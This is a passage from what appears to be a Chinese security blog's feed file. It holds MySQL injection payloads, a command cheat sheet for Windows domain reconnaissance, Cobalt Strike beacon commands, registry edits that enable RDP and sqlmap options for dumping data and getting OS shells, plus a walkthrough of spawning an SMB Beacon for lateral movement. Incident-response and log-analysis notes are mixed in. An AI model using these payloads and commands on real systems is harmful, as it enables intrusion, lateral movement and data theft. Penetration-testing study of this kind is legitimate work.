(SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name&#x3D;0x656d61696c73 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23<br></pre></p></td></tr></tbody></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>1）主要使用sleep()函数进行判断</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>if(ascii(substr(user(),1,1))=114,sleep(5),2)id=1' and length(database())>=4--+</pre></td></tr></tbody></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>在SQL中，分号（;）是用来表示一条sql语句的结束。在 ; 结束一个sql语句后继续构造下一条语句也就造就了堆叠注入</pre></td></tr></tbody></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>id=1%df'id=1%df' %23id=1%df' union select 1,2,3,database(),5,6,7,8%23</pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令速查表--长期更新</title>
      <link href="/2022/09/03/%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8--%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
      <url>/2022/09/03/%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8--%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/Code/2.png" data-caption="image-code"><img src="/../images/Code/2.png" alt="image-code"></a></p><h2 id="cmd信息收集基本命令"><a href="#cmd信息收集基本命令" class="headerlink" title="cmd信息收集基本命令"></a>cmd信息收集基本命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>ipconfig &#x2F;all</td><td>查询本机IP段，所在域等</td></tr><tr><td>net user</td><td>本机用户列表</td></tr><tr><td>net localgroup administrators</td><td>本机管理员[通常含有域用户]</td></tr><tr><td>net user &#x2F;domain</td><td>查询域用户</td></tr><tr><td>net group &#x2F;domain</td><td>查询域里面的工作组</td></tr><tr><td>net group “domain admins” &#x2F;domain</td><td>查询域管理员用户组</td></tr><tr><td>net localgroup administrators &#x2F;domain</td><td>登录本机的域管理员</td></tr><tr><td>net localgroup administrators workgroup\user001 &#x2F;add</td><td>域用户添加到本机</td></tr><tr><td>net group “domain controllers” &#x2F;domain</td><td>查看域控制器(如果有多台)</td></tr><tr><td>net time &#x2F;domain</td><td>判断主域，主域服务器都做时间服务器</td></tr><tr><td>net config workstation</td><td>当前登录域</td></tr><tr><td>net session</td><td>查看当前会话</td></tr><tr><td>net use \ip\ipc$ pawword &#x2F;user:username</td><td>建立IPC会话</td></tr><tr><td>net share</td><td>查看SMB指向的路径[即共享]</td></tr><tr><td>net view</td><td>查询同一域内机器列表</td></tr><tr><td>net view \ip</td><td>查询某IP共享</td></tr><tr><td>net view &#x2F;domain</td><td>查询域列表</td></tr><tr><td>net view &#x2F;domain:domainname</td><td>查看workgroup域中计算机列表</td></tr><tr><td>net start</td><td>查看当前运行的服务</td></tr><tr><td>net accounts</td><td>查看本地密码策略</td></tr><tr><td>net accounts &#x2F;domain</td><td>查看域密码策略</td></tr><tr><td>nbtstat –A ip</td><td>netbios 查询</td></tr><tr><td>netstat –an&#x2F;ano&#x2F;anb</td><td>网络连接查询</td></tr><tr><td>route print</td><td>路由表</td></tr><tr><td>tasklist &#x2F;V</td><td>查看进程[显示对应用户]</td></tr><tr><td>tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V</td><td>查看远程计算机进程列表</td></tr><tr><td>qprocess *</td><td>类似tasklist</td></tr><tr><td>qprocess &#x2F;SERVER:IP</td><td>远程查看计算机进程列表</td></tr><tr><td>nslookup –qt-MX Yahoo.com</td><td>查看邮件服务器</td></tr><tr><td>whoami &#x2F;all</td><td>查询当前用户权限等</td></tr><tr><td>set</td><td>查看系统环境变量</td></tr><tr><td>systeminfo</td><td>查看系统信息</td></tr><tr><td>qwinsta</td><td>查看登录情况</td></tr><tr><td>qwinsta &#x2F;SERVER:IP</td><td>查看远程登录情况</td></tr><tr><td>fsutil fsinfo drives</td><td>查看所有盘符</td></tr><tr><td>gpupdate &#x2F;force</td><td>更新域策略</td></tr><tr><td>cmdkey &#x2F;l</td><td>看是否保存了登陆凭证。（攻击者会先查看管理员是否保留了登陆凭证，方便后续的凭证抓取。）</td></tr><tr><td>echo %logonserver%</td><td>查看登陆域</td></tr></tbody></table><h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><table><thead><tr><th align="left">命令</th><th>作用</th></tr></thead><tbody><tr><td align="left">lsof -i</td><td>显示所有连接</td></tr><tr><td align="left">lsof -i 4</td><td>查看IPv4流量</td></tr><tr><td align="left">lsof -i 6</td><td>查看IPv6流量</td></tr><tr><td align="left">lsof -i TCP</td><td>查看TCP流量</td></tr><tr><td align="left">lsof  -i UDP</td><td>查看UDP流量</td></tr><tr><td align="left">lsof -i :22</td><td>查看端口绑定的应用</td></tr><tr><td align="left">lsof <a href="mailto:&#45;&#x69;&#x40;&#49;&#46;&#x31;&#x2e;&#49;&#46;&#x31;">&#45;&#x69;&#x40;&#49;&#46;&#x31;&#x2e;&#49;&#46;&#x31;</a></td><td>显示指定主机连接的信息</td></tr><tr><td align="left">lsof <a href="mailto:&#45;&#105;&#x40;&#49;&#46;&#49;&#46;&#49;&#x2e;&#49;">&#45;&#105;&#x40;&#49;&#46;&#49;&#46;&#49;&#x2e;&#49;</a>:3333</td><td>显示基于主机与端口连接的信息</td></tr><tr><td align="left">lsof -i -sTCP:LISTEN</td><td>显示正在监听的端</td></tr><tr><td align="left">lsof -i -sTCP:ESTABLISHED</td><td>显示已建立连接信息</td></tr><tr><td align="left">lsof -u root</td><td>显示指定用户打开文件信息</td></tr><tr><td align="left">lsof -u ^root</td><td>显示除指定用户外打开文件信息</td></tr><tr><td align="left">lsof -p 22222</td><td>显示指定PID打开文件信息</td></tr><tr><td align="left">lsof &#x2F;var&#x2F;log&#x2F;messages</td><td>显示与指定目录交互的所有一切</td></tr><tr><td align="left">lsof &#x2F;home&#x2F;daniel&#x2F;firewall_whitelist.txt</td><td>显示与指定文件交互的所有一切</td></tr></tbody></table><h2 id="Windwos应急响应"><a href="#Windwos应急响应" class="headerlink" title="Windwos应急响应"></a>Windwos应急响应</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>netstat -ano</td><td>查看端口情况</td></tr><tr><td>tasklist | findstr “PID”</td><td>定位PID</td></tr><tr><td>netstat -ano -p tcp</td><td>查看端口情况，指定TCP</td></tr><tr><td>systeminfo</td><td>系统信息核查运⾏</td></tr><tr><td>lusrmgr.msc</td><td>可疑账号排查（Win+R）</td></tr><tr><td>regedit</td><td>查看注册表</td></tr><tr><td>C:\Documents and Settings&#x2F;</td><td>查看用户目录</td></tr><tr><td>%UserProfile%\Recent</td><td>查看最近文件（Win+R）</td></tr><tr><td>eventvwr.msc</td><td>查看日志事件</td></tr><tr><td>C:\Windows\System32\winevt\Logs</td><td>日志存储路径</td></tr><tr><td>msconfig</td><td>异常启动项(Win+R)</td></tr><tr><td>taskschd.msc</td><td>计划任务(Win+R)</td></tr><tr><td>schtasks.exe</td><td>cmd,查看计划任务</td></tr><tr><td>taskkill &#x2F;T &#x2F;F &#x2F;PID pid号</td><td>强制杀死进程（&#x2F;F强制、&#x2F;T子进程）</td></tr><tr><td>services.msc</td><td>服务管理器</td></tr></tbody></table><h2 id="Linux-应急响应"><a href="#Linux-应急响应" class="headerlink" title="Linux 应急响应"></a>Linux 应急响应</h2><h2 id="Cobaltstrike信息收集"><a href="#Cobaltstrike信息收集" class="headerlink" title="Cobaltstrike信息收集"></a>Cobaltstrike信息收集</h2><table><thead><tr><th>域环境判断</th><th>作用</th></tr></thead><tbody><tr><td>ipconfig &#x2F;all</td><td>查看网卡详细信息,若存在域，主DNS后缀会显示域信息,若为工作组则不显示</td></tr><tr><td>shell systemctl</td><td>查看系统详细信息</td></tr><tr><td>shell net config workstation</td><td>查看当前登录域信息</td></tr><tr><td>shell net time &#x2F;domain</td><td>查看域内时间</td></tr></tbody></table><table><thead><tr><th>域环境信息收集</th><th>作用</th></tr></thead><tbody><tr><td>shell net view &#x2F;domain</td><td>查看域列表</td></tr><tr><td>shell net view &#x2F;domain:域名称</td><td>枚举域主机（部分主机，网上邻居内容）</td></tr><tr><td>shell net group “domain  computers” &#x2F;domain</td><td>查看域内成员</td></tr><tr><td>net user &#x2F;domain</td><td>查看域内成员</td></tr><tr><td>shell net group “domain  admins” &#x2F;domain</td><td>查看域管理员</td></tr><tr><td>shell net group “domain  controllers” &#x2F;domain</td><td>查看域控主机</td></tr><tr><td>shell nltest&#x2F;dclist:域名称</td><td>查看域控主机</td></tr><tr><td>shell ping 主机名(可在枚举域主机查找)</td><td>查看目标主机IP</td></tr><tr><td>shell nslookup 主机名</td><td>查看目标主机IP</td></tr><tr><td>shell net group  “enterprise admins” &#x2F;domain</td><td>查询企业管理员，查询企业指定系统管理员用户。</td></tr><tr><td>shell nltest &#x2F;domain_trusts</td><td>查看域信任关系</td></tr><tr><td>shell net vire \主机名</td><td>列出主机共享列表</td></tr><tr><td>shell wmic useraccount get  &#x2F;all</td><td>查询域用户详细信息</td></tr><tr><td>shell whoami &#x2F;all</td><td>获取域SID，获取域SID值，可以用于票据传递攻击。</td></tr><tr><td>shell net time &#x2F;domain</td><td>查看域内时间（可作定位主域控制器）</td></tr><tr><td>shell net localgroup  administrators &#x2F;domain</td><td>查看登录本机的域管理员</td></tr><tr><td>shell netdom query pdc</td><td>查看域内所有用户组列表</td></tr><tr><td>shell nltest &#x2F;DCLIST:域名称</td><td>通过nltest定位主域控制器</td></tr><tr><td>shell net accounts &#x2F;domain</td><td>查看域内密码策略信息</td></tr></tbody></table><table><thead><tr><th>单主机信息收集</th><th>作用</th></tr></thead><tbody><tr><td>shell ipconfig &#x2F;all</td><td>查看本机网络配置信息</td></tr><tr><td>systeminfo | findstr &#x2F;B  &#x2F;C:”OS Nmae” &#x2F;C:”OS Version”</td><td>查看操作系统及版本信息，针对性搜集相关系统版本的漏洞EXP，英文版系统用这条命令</td></tr><tr><td>systeminfo | findstr &#x2F;B  &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</td><td>查看操作系统及版本信息，针对性搜集相关系统版本的漏洞EXP，中文版系统用这条命令</td></tr><tr><td>shell echo  %PROCESSOR_ARCHITECTURE%</td><td>查看系统体系结构，需要使用相对应版本兼容性的渗透工具</td></tr><tr><td>shell wmic product get  name,version</td><td>查看安装程序及版本信息</td></tr><tr><td>shell wmic service list brief</td><td>查看本机服务信息</td></tr><tr><td>shell tasklist &#x2F;v</td><td>查看进程列表，查看当前进程列表对应的用户身份命令、对应执行的用户身份</td></tr><tr><td>shell tasklist &#x2F;svc</td><td>查看当前本地运行的程序、进程PID号、服务名，可以将执行命令的返回结果去查询是否有杀毒软件在运行</td></tr><tr><td>shell wmic startup get  command,caption</td><td>查看启动程序信息，了解当前机器开机的时候会运行哪些程序，是否可利用自启动劫持</td></tr><tr><td>shell schtasks &#x2F;query &#x2F;fo LIST  &#x2F;v</td><td>查看计划任务</td></tr><tr><td>shell net statistics  workstation</td><td>查看主机开机时间，判断这台机器的管理员是不是经常在登陆这台机器</td></tr><tr><td>shell net user</td><td>查看用户列表</td></tr><tr><td>shell query user || qwinsta</td><td>查看当前在线用户</td></tr><tr><td>shell netstat -ano</td><td>查看本机端口开放情况，查看连接分析是否存在敏感服务</td></tr><tr><td>shell wmic qfe get  Caption,Description,HotFixID,InstalledOn</td><td>查询补丁信息，包含说明链接&#x2F;补丁描述&#x2F;KB编号&#x2F;更新时间等信息</td></tr><tr><td>shell wmic qfe list full</td><td>查询补丁全部信息</td></tr><tr><td>shell route print</td><td>查看路由信息</td></tr><tr><td>shell arp -a</td><td>查看arp缓存</td></tr><tr><td>shell netsh firewall show  config</td><td>查看防火墙配置</td></tr></tbody></table><table><thead><tr><th>3389</th><th>作用</th></tr></thead><tbody><tr><td>shell REG QUERY  “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal  Server\WinStations\RDP-Tcp” &#x2F;V PortNumber</td><td>查看远程桌面服务是否开启，在cmd下使用注册表查询语句，命令如下，得到连接端口为0xd3d，转换后为3389</td></tr><tr><td>shell REG ADD  HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v  fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</td><td>开启3389</td></tr><tr><td>shell REG ADD  HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v  fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</td><td>关闭3389</td></tr></tbody></table><h2 id="Everything搜索语句"><a href="#Everything搜索语句" class="headerlink" title="Everything搜索语句"></a>Everything搜索语句</h2><table><thead><tr><th>语句</th><th>作用</th></tr></thead><tbody><tr><td>dm:2022&#x2F;9&#x2F;1-2022&#x2F;9&#x2F;2 <em>.exe|</em>.bat|*.vbs</td><td>搜索指定时间新建的exe、bat、vbs文件</td></tr><tr><td>empty:</td><td>搜索空文件夹</td></tr><tr><td>dm:thisyear</td><td>搜索当年文件</td></tr><tr><td>dc:thisweek</td><td>搜索这周创建的文件和文件夹</td></tr><tr><td>dm:today</td><td>搜索今日修改的文件</td></tr><tr><td>dm:2019-2021</td><td>搜索具体年份</td></tr><tr><td>d:|e: *.jpg</td><td>搜索分区 D: 或 E: 上 jpg 文件</td></tr><tr><td>!.</td><td>搜索无扩展名的文件或文件夹</td></tr><tr><td>size:&gt;1mb</td><td>搜索大于 1MB 的文件</td></tr></tbody></table><h2 id="Docker基础命令"><a href="#Docker基础命令" class="headerlink" title="Docker基础命令"></a>Docker基础命令</h2><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>docker search tomcat</td><td>搜索镜像</td></tr><tr><td>docker pull dordoka&#x2F;tomcat</td><td>拉取镜像</td></tr><tr><td>docker images</td><td>查看镜像</td></tr><tr><td>docker stop [容器ID或容器名]</td><td>停止镜像</td></tr><tr><td>docker rmi [OPTIONS] [IMAGEID]</td><td>删除本地镜像，-f 强制删除，–no-prune:不移除镜像产生的过程镜像。默认为移除。</td></tr><tr><td>docker run dordoka&#x2F;tomcat</td><td>生成容器</td></tr><tr><td>docker run -p 8080:8080 -d doradoka&#x2F;tomcat</td><td>指定端口生成容器.8080:8080,第一个本机端口、第二个容器运行服务的端口</td></tr><tr><td>docker run -it ubuntu</td><td>生成容器后获取交互式终端（ubuntu）</td></tr><tr><td>docker ps</td><td>查看容器</td></tr><tr><td>docker exec -it 6e &#x2F;bin&#x2F;bash</td><td>进入容器</td></tr><tr><td>docker cp .&#x2F;flag.txt 28:&#x2F;var</td><td>复制文件进入容器</td></tr><tr><td>docker cp 28:&#x2F;var C:\Users\flag.txt</td><td>复制文件到本地</td></tr><tr><td>docker ps -l</td><td>显示最近创建的容器</td></tr><tr><td>docker rm [IMAGEID]</td><td>删掉一个或多个容器</td></tr></tbody></table><h2 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h2><h3 id="常用事件-ID-含义"><a href="#常用事件-ID-含义" class="headerlink" title="常用事件 ID 含义"></a>常用事件 ID 含义</h3><table><thead><tr><th>Event ID(2000&#x2F;XP&#x2F;2003)</th><th>Event ID(Vista&#x2F;7&#x2F;8&#x2F;2008&#x2F;2012)</th><th>描述</th><th>日志名称</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>Security</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>Security</td></tr><tr><td>680</td><td>4776</td><td>成功&#x2F;失败的账户认证</td><td>Security</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>Security</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>Security</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>Security</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>System</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC服务服务的启动类型已从禁用更改为自动启动</td><td>System</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td>System</td></tr><tr><td>556</td><td>4662</td><td>DC hash传递攻击</td><td>Security</td></tr></tbody></table><h3 id="登陆类型"><a href="#登陆类型" class="headerlink" title="登陆类型"></a>登陆类型</h3><table><thead><tr><th>登录类型</th><th>描述</th></tr></thead><tbody><tr><td>Interactive</td><td>用户登录到本机</td></tr><tr><td>Network</td><td>用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享</td></tr><tr><td>Batch</td><td>批处理登录类型，无需用户干预</td></tr><tr><td>Service</td><td>服务控制管理器登录</td></tr><tr><td>Unlock</td><td>用户解锁主机</td></tr><tr><td>NetworkCleartext</td><td>用户从网络登录到此计算机，用户密码用非哈希的形式传递</td></tr><tr><td>NewCredentials</td><td>进程或线程克隆了其当前令牌，但为出站连接指定了新凭据</td></tr><tr><td>Remotelnteractive</td><td>使用终端服务或远程桌面连接登录</td></tr><tr><td>Cachedlnteractive</td><td>用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志</td></tr><tr><td>CachedRemotelnteractive</td><td>与 Remotelnteractive 相同，内部用于审计目的</td></tr><tr><td>CachedUnlock</td><td>登录尝试解锁</td></tr></tbody></table><h2 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h2><h3 id="Windwos"><a href="#Windwos" class="headerlink" title="Windwos"></a>Windwos</h3><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>route add  198.18.1.0（网段） MASK 255.255.255.0(掩码) 198.18.123.1(网关)</td><td>添加路由</td></tr><tr><td>route print 和 netstat -r</td><td>查看路由表</td></tr><tr><td>route delete  10.10.10.0</td><td>删除路由</td></tr></tbody></table><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>sudo route add -net 198.18.1.0 netmask 255.255.255.0 gw 198.18.123.1</td><td>添加路由</td></tr><tr><td>route</td><td>查看路由表</td></tr><tr><td>route del -net 192.168.0.0&#x2F;24 gw 192.168.0.1</td><td>删除路由</td></tr></tbody></table><h2 id="Sqlmap常用参数"><a href="#Sqlmap常用参数" class="headerlink" title="Sqlmap常用参数"></a>Sqlmap常用参数</h2><table><thead><tr><th>命令参数</th><th>参数作用</th></tr></thead><tbody><tr><td>-u</td><td>指定目标url</td></tr><tr><td>-r</td><td>从文件中加载HTTP请求（数据包）</td></tr><tr><td>*</td><td>json格式指定参数，如指定参数orderNo：{“phoneNo”:”15123456789”,”platNum”:”844519422627945”,”orderNo”:”1*”}</td></tr><tr><td>-m</td><td>从文本中获取多个目标扫描</td></tr><tr><td>–data</td><td>以POST方式提交数据</td></tr><tr><td>-random-agent</td><td>随机User-Agent</td></tr><tr><td>–user-agent</td><td>指定User-Agent</td></tr><tr><td>–delay</td><td>设置请求间的延迟</td></tr><tr><td>–timeout</td><td>指定超时时间</td></tr><tr><td>–dbms</td><td>指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等</td></tr><tr><td>–os</td><td>指定数据库服务器操作系统</td></tr><tr><td>–tamper</td><td>指定脚本tamper</td></tr><tr><td>–level</td><td>指定探测等级</td></tr><tr><td>–risk</td><td>指定风险等级</td></tr><tr><td>–technique</td><td>B: Boolean-based blind SQL injection<br/>E: Error-based SQL injection<br/>U: UNION query SQL injection<br/>S: Stacked queries SQL injection<br/>T: Time-based blind SQL injection</td></tr><tr><td>-p</td><td>指定需要测试的参数</td></tr><tr><td>–batch</td><td>自动选择Y&#x2F;N</td></tr><tr><td>–dbs</td><td>枚举数据库</td></tr><tr><td>-D</td><td>DATABASE：指定数据库</td></tr><tr><td>–tables</td><td>枚举表名</td></tr><tr><td>-T</td><td>指定表名</td></tr><tr><td>–columns</td><td>枚举列名</td></tr><tr><td>-D</td><td>COLUMN：指定字段</td></tr><tr><td>–dump</td><td>脱取指定字段</td></tr><tr><td>–dump-all</td><td>脱取数据库全部字段</td></tr><tr><td>-a&#x2F;–all</td><td>获取所有信息</td></tr><tr><td>-b&#x2F;–banner</td><td>获取banner信息</td></tr><tr><td>–current-user</td><td>获取当前数据库用户</td></tr><tr><td>–is-dba</td><td>判断当前用户是否为DBA权限</td></tr><tr><td>–users</td><td>枚举用户列表</td></tr><tr><td>–sql-shell</td><td>返回交互式sql的shell</td></tr><tr><td>–os-shell</td><td>返回交互式的操作系统shell</td></tr><tr><td>–os-cmd</td><td>执行OS命令CMD</td></tr><tr><td>–cookie&#x3D;COOKIE</td><td>伪造cookie</td></tr><tr><td>–proxy&#x3D;PROXY</td><td>使用代理连接目标 URL</td></tr><tr><td>–mobile</td><td>使用 HTTP User-Agent 模仿智能手机</td></tr><tr><td>-H HEADER</td><td>设置额外的 HTTP 头参数（例如：”X-Forwarded-For: 127.0.0.1”）</td></tr><tr><td>–ignore-proxy</td><td>忽略系统默认代理设置</td></tr><tr><td>*</td><td>在</td></tr><tr><td>–keep-alive</td><td>保持连接，出现[CRITICAL] connection……报错的时候，使用这个参数</td></tr><tr><td>–referer <a href="http://www.baidu.com/">http://www.baidu.com</a></td><td>#伪造referer字段</td></tr><tr><td>-v 3</td><td>输出详细度,最大值5,会显示请求包和回复包</td></tr><tr><td>–roles</td><td>列出数据库所有管理员角色，仅适用于oracle数据库的时候</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 命令备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike-派生SMB_Beacon</title>
      <link href="/2022/09/03/Cobaltstrike-%E6%B4%BE%E7%94%9FSMB-Beacon/"/>
      <url>/2022/09/03/Cobaltstrike-%E6%B4%BE%E7%94%9FSMB-Beacon/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="SMB-Beacon-简介"><a href="#SMB-Beacon-简介" class="headerlink" title="SMB Beacon 简介"></a>SMB Beacon 简介</h2><p>派生 SMB Beacon，Cobastrike 内网横向渗透扩展功能，Windows 将命名管道通信封装在 SMB 协议中，此流量封装在SMB协议中，所以SMB beacon相对隐蔽，能最大程度规避安全设备及防火墙的发现。SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效，即 SMB Beacon 通过管道（ pipe）进行进程间的数据传递。管道通信的进程可以是本地主机上的两个进程，也可以和远程主机上的进程通过网络进行通信。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/1.png" data-caption="3.1"><img src="/../images/Beacon/1.png" alt="3.1"></a></p><h2 id="使用要求"><a href="#使用要求" class="headerlink" title="使用要求"></a>使用要求</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">具有SMB Beacon的主机必须接受端口445上的连接。</span><br><span class="line">只能链接由同一Cobalt Strike实例管理的Beacon。</span><br></pre></td></tr></table></figure></div><h2 id="派生-SMB-Beacon"><a href="#派生-SMB-Beacon" class="headerlink" title="派生 SMB Beacon"></a>派生 SMB Beacon</h2><p>1、通过前期打点，已上线CS，获取beacon</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/2.png" data-caption="image-20220903110750284"><img src="/../images/Beacon/2.png" alt="image-20220903110750284"></a></p><p>2、派生SMB Beacon</p><p>新建SMB Beacon 监听器</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/3.png" data-caption="image-20220903110819958"><img src="/../images/Beacon/3.png" alt="image-20220903110819958"></a></p><p>派生会话SMB Beacon，个人习惯首先sleep 0，右键选中HTTP监听器上线的主机，interact进入Beacon控制台，输入spawn加SMB Beacon的监听器名称，刚新建名称为SMB，所以执行<code>spawn SMB</code>，运行成功后在external中可以看到IP后有个<code>∞∞</code>字符的派生SMB Beacon。</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/4.png" data-caption="image-20220902223114325"><img src="/../images/Beacon/4.png" alt="image-20220902223114325"></a></p><p>此时派生Beacon可同父Beacon一样执行命令</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/5.png" data-caption="image-20220903112356439"><img src="/../images/Beacon/5.png" alt="image-20220903112356439"></a></p><h2 id="团伙协作-（失败）"><a href="#团伙协作-（失败）" class="headerlink" title="团伙协作-（失败）"></a>团伙协作-（失败）</h2><p>主从服务器 派生 到队伍服务器。SMB Beacon可派生多个Beacon，可独立派生Beacon给团队每一位成员，且Beacon在各自的服务器上，互不影响。即从主从服务器派生到队伍服务器</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">队友服务器 Listen 生成 &gt; 团队服务器 Listen 生成 使用队友IP &gt; Spawn</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Beacon/6.png" data-caption="image-20220903113550312"><img src="/../images/Beacon/6.png" alt="image-20220903113550312"></a></p><p><a data-fancybox="gallery" data-src="/../images/Beacon/7.png" data-caption="image-20220903113820361"><img src="/../images/Beacon/7.png" alt="image-20220903113820361"></a></p><p>很遗憾，这一步参考了很多文章都无法实现，后补…..</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/q20010619/article/details/121755856</span><br><span class="line">http://www.luckyzmj.cn/posts/35eac48c.html</span><br><span class="line">https://www.cnblogs.com/f-carey/p/15844629.html#tid-z8j5nK</span><br><span class="line">http://blog.leanote.com/cate/snowming/Cobalt-Strike</span><br><span class="line">http://blog.leanote.com/post/snowming/2ec80f7823e0</span><br><span class="line">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82%5BSMB%20Beacon%5D.md</span><br><span class="line">https://apt404.github.io/2017/12/29/cobalt-strike-spawn/</span><br><span class="line">http://blog.leanote.com/post/snowming/de88219734d1</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson-1.2.47漏洞环境搭建及复现</title>
      <link href="/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
